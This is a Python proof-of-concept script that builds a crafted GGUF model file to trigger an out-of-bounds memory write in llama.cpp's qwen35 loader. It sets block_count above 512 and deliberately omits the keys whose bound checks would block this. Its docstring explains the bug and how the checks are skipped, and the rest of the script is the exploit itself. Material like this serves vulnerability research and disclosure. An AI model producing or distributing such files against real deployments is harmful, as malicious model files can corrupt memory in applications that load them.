#!/usr/bin/env python3
"""
Craft a minimal GGUF that triggers an OOB write in llama_model_qwen35::load_arch_hparams.

Bug: when `attention.recurrent_layers` array is ABSENT, the fallback loop runs
  for (uint32_t i = 0; i < hparams.n_layer_all; ++i) hparams.is_recr_impl[i] = ...
`is_recr_impl` is `std::array<uint32_t, LLAMA_MAX_LAYERS>` (LLAMA_MAX_LAYERS=512).
Setting `block_count` (n_layer_all) > 512 -> heap OOB write.

The base loader's `get_key_or_arr(...,n_layer()...)` guards (n > N_MAX) only fire
when the key is PRESENT. By omitting feed_forward_length / attention.head_count[_kv]
we skip those guards and reach load_arch_hparams with n_layer_all > 512.

Run:  python3 craft_oob_qwen35.py out.gguf [block_count]
"""
import sys, os
from pathlib import Path
gguf_path = Path(__file__).resolve().parent.parent / "llama.cpp" / "gguf-py"
sys.path.insert(0, str(gguf_path))
import gguf

V = gguf.GGUFValueType

def main():
    out = sys.argv[1] if len(sys.argv) > 1 else "models/crafted/qwen35_oob.gguf"
    block_count = int(sys.argv[2]) if len(sys.argv) > 2 else 600
    os.makedirs(os.path.dirname(out) or ".", exist_ok=True)

    w = gguf.GGUFWriter(out, arch="qwen35")

    def kv(key, val, t):
        w.add_key_value(key, val, t)

    # base loader required keys
    kv("qwen35.context_length", 2048, V.UINT32)
    kv("qwen35.embedding_length", 64, V.UINT32)
    kv("qwen35.block_count", block_count, V.UINT32)

    # qwen35 load_arch_hparams required keys
    kv("qwen35.attention.layer_norm_rms_epsilon", 1e-6, V.FLOAT32)
    # rope.dimension_sections: array of 4 ints (required, n=4)
    w.add_key_value("qwen35.rope.dimension_sections",
                    [0, 0, 0, 0], V.ARRAY, sub_type=V.INT32)
    # ssm.* required
    kv("qwen35.ssm.conv_kernel", 4, V.UINT32)
    kv("qwen35.ssm.inner_size", 128, V.UINT32)
    kv("qwen35.ssm.state_size", 16, V.UINT32)
    kv("qwen35.ssm.time_step_rank", 16, V.UINT32)
    kv("qwen35.ssm.group_count", 1, V.UINT32)

    # INTENTIONALLY OMIT:
    #   qwen35.feed_forward_length           (array)
    #   qwen35.attention.head_count           (array or scalar)
    #   qwen35.attention.head_count_kv        (array or scalar)
    #   qwen35.attention.recurrent_layers     (array)  <-- enables the vulnerable fallback loop
    #   qwen35.nextn_predict_layers           -> defaults to 0, n_layer()==n_layer_all

    w.write_header_to_file()
    w.write_kv_data_to_file()
    w.write_ti_data_to_file()
    w.close()
    print(f"[+] wrote {out}  block_count={block_count}  (no tensors, metadata only)")

if __name__ == "__main__":
    main()